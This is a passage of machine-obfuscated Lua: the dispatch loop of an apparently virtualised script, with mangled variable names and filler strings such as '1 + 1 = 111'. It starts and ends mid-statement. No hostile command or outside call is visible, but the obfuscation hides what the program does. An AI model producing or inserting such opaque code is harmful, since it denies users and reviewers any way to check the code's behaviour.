111";}];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("SP")]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IIIlIllIllllIIllIlllIIll+1,ajefa_lllIIlIllIlIllllIIlIIlll[#{{161;681;109;378};{514;511;128;706};"1 + 1 = 111";}]))ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("eN")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("KZA")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("7E3M")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";"1 + 1 = 111";}]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("9Su")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("4k")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("skO")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("6eRQ")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("WD")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("CUt")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("sL")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("F4F")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("BC")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("lj6")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("yKMh")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("nB")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("3u9")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("IO5O")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("RX")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("I93")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("OBjQ")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("S5")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";{944;342;412;221};"1 + 1 = 111";}]][ajefa_lllIIlIllIlIllllIIlIIlll[#("Q0eu")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Bj")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("0uZ")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("0pef")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("au")]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IIIlIllIllllIIllIlllIIll+1,ajefa_lllIIlIllIlIllllIIlIIlll[#("cO0")]))ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("D3")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("D2N")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";"1 + 1 = 111";{76;591;320;446};"1 + 1 = 111";}]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("OQ")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("Z8G")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("jPCF")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Rb")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("qg7")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("XZID")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";{65;215;594;15};}]][ajefa_lllIIlIllIlIllllIIlIIlll[#("2G3")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";{272;900;645;180};"1 + 1 = 111";{274;533;478;816};}];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("gH")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("TFZ")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("GtmQ")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("zj")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("qL2")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("g9vE")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("AF")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("pQy")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("iGGb")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("ny")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("epe")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("b7uT")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("30")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("sgB")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("TD")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{{350;576;601;361};"1 + 1 = 111";{5;197;66;324};}]][ajefa_lllIIlIllIlIllllIIlIIlll[#("89On")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";{50;586;634;743};}]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("EUW")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("LZ")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("ZdV")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("JX")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("BkG")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("0sLp")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("hG")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("YIJ")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("Yd88")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("ec")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("97B")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("1tbD")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("zM")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Lve")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("jt8Z")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("xb")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{{410;462;953;82};"1 + 1 = 111";"1 + 1 = 111";}]][ajefa_lllIIlIllIlIllllIIlIIlll[#("rtG0")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";"1 + 1 = 111";}]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IIIlIllIllllIIllIlllIIll+1,ajefa_lllIIlIllIlIllllIIlIIlll[#("e27")]))ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("sp")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("GpY")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("JV")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Zv0")]][ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";{270;90;807;820};"1 + 1 = 111";{976;240;621;773};}]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("v8")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("4dT")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("eF")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("UIU")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";"1 + 1 = 111";}]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("IKb")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("d0")]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IIIlIllIllllIIllIlllIIll+1,ajefa_lllIIlIllIlIllllIIlIIlll[#("208")]))ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("xr")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("QVF")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("HP9H")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Yj")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("59p")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("3E")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("mfb")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("Yyf3")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("ex")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("Tbc")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("aI")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("hoo")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("ts")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Mkq")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("eHIB")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("l9")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Pyn")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("R614")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{{418;901;777;322};{447;359;474;995};}]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("0nI")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("PbZ4")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("29")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("rR1")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("HWVm")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("3V")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{{168;205;609;157};"1 + 1 = 111";"1 + 1 = 111";}]][ajefa_lllIIlIllIlIllllIIlIIlll[#("gLaZ")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("Rs")]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IIIlIllIllllIIllIlllIIll+1,ajefa_lllIIlIllIlIllllIIlIIlll[#("YlQ")]))ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Oo")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("Gla")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("0E")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("HyM")]][ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";}]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("kQ")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("MBF")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Nr")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("EaU")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("fe")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("VUR")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("2t")]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IIIlIllIllllIIllIlllIIll+1,ajefa_lllIIlIllIlIllllIIlIIlll[#("Ivp")]))ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("h1")]][ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";{979;356;444;332};{920;671;137;192};}]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{{732;596;598;880};"1 + 1 = 111";{237;832;827;949};{194;447;481;445};}]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("tD")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("7sT")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("C5")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("EN8")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("UWff")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Y9")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("xS7")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("S0Ia")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("gx")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("L4d")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("G0eP")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";"1 + 1 = 